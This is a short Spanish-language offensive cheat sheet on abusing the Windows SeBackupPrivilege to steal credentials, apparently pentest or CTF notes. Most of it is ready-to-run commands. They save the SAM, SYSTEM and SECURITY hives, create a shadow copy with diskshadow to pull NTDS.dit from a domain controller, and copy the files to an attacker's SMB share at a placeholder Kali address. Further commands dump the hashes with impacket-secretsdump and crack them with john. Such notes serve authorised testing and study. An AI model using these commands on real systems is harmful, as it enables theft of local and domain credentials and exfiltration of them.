Backup

SeBackupPrivilege Permite leer archivos protegidos, SAM y SYSTEM, SECURITY y NTDS.dit EnableSeBackupPrivilege.ps1: Habilitar Privilegio si esta deshabilitado

SeBackupPrivilege permite leer ficheros saltándose ACLs mediante semántica de backup. Para extraer secretos locales suelen hacer falta SAM y SYSTEM; en un DC, NTDS.dit contiene credenciales de dominio.

PowerShell: Importar módulos

Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

Copiar y leer archivos protegidos

PowerShell: Podemos copiar y leer archivos protegidos

Copy-FileSeBackupPrivilege 'C:\Confidential\Contract.txt' .\Contract.txt

Volcar SAM/SYSTEM/SECURITY del DC

SAM/SYSTEM SAM: Almacena hashes de usuarios locales cifrados SYSTEM: LLave que descifra los hashes de SAM

SECURITY SECURITY: Almacena LSA Secrets del proceso LSASS

Extraer SAM/SYSTEM SECURITY

# Kali: SMB Server
impacket-smbserver recurso $(pwd) -smb2support

# Extraer Datos desde Kali
impacket-reg '<dominio>/<user>:<pass>@<target_ip>' backup -o '\\<kali_ip>\recurso'
# Extraer Datos desde Windows
reg.exe save hklm\sam '\\<kali_ip>\recurso\SAM.save'
reg.exe save hklm\system '\\<kali_ip>\recurso\SYSTEM.save'
reg.exe save hklm\security '\\<kali_ip>\recurso\SECURITY.save'

Volcar Registros

# Dumpear SAM y SECURITY (LSA Secrets)
impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
# Dumpear SAM
impacket-secretsdump -sam SAM.save -system SYSTEM.save LOCAL
samdump2 SAM.save SYSTEM.save -o sam.txt

# Crackear Hash
john --format=NT --wordlist=rockyou.txt sam.txt

Volcar fichero NTDS.dit del DC

Opción1 -> DiskShadow EXEC: Extraer ntds.dit

# Kali: Crear shadow.txt (cada línea debe tener un espacio extra al final porque falla)
# shadow.txt
set context persistent nowriters
add volume c: alias unidad
create
expose %unidad% z:

Lanzar diskshadow ejecutando shadow.txt

# Windows
diskshadow.exe /s c:\Temp\shadow.txt

Recuperar el fichero ntds.dit que se encuentra en originalmente en c:\Windows\NTDS\ desde z:\Windows\NTDS\

# Windows
robocopy /b z:\Windows\NTDS\ . ntds.dit

Opción2 -> PowerShell DiskShadow GUI: Extraer ntds.dit

diskshadow.exe

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit

Transferir archivo con SMB

# Kali
impacket-smbserver smb $(pwd) -smb2support -debug
# Windows
copy ntds.dit //<kali_ip>/smb/
reg.exe save hklm\system \\kali_ip\smb\SYSTEM.save

Kali: Volcar ntds.dit

impacket-secretsdump -ntds ntds.dit -system SYSTEM.save -hashes lmhash:nthash LOCAL
